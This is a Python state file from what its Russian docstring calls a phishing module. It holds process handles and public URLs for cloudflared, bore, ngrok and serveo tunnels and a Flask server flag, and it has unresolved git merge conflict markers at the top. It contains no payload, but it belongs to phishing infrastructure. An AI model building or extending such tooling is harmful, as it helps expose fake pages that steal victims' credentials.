<<<<<<< HEAD
import os as _os
# PATCH v3: Fish module does NOT manage tunnels (admin_web.py is the only tunnel manager)
# This prevents the fish/admin tunnel conflict
_FISH_TUNNEL_DISABLED = _os.environ.get("FISH_TUNNEL_DISABLED", "true").lower() == "true"

def _check_tunnel_allowed():
    if _FISH_TUNNEL_DISABLED:
        raise RuntimeError(
            "FISH_TUNNEL_DISABLED=true: tunnel is managed exclusively by admin_web.py. "
            "Use /api/tunnel/start in admin panel."
        )

=======
>>>>>>> 1b23aae79cb517aabb8db6904939521ab4d04999
"""
fish_bot_state.py — глобальный стейт фишинг-модуля.
Хранит tunnel_process и tunnel_url, чтобы fish_web.py и bot.py
могли читать состояние туннеля без циклических импортов.
"""
tunnel_process  = None   # cloudflared процесс (основной авто-фоллбэк)
tunnel_url      = None   # URL от cloudflared
bore_process    = None   # bore — отдельный процесс
bore_url        = None   # URL вида http://bore.pub:XXXXX
ngrok_process   = None   # ngrok — отдельный процесс
ngrok_url       = None   # URL вида https://xxxx.ngrok-free.app
serveo_process  = None   # serveo — SSH-тоннель, отдельный процесс
serveo_url      = None   # URL вида https://xxxx.serveo.net
server_thread   = None   # threading.Thread Flask-сервера
server_running  = False  # Flask жив?
last_loaded_url = None
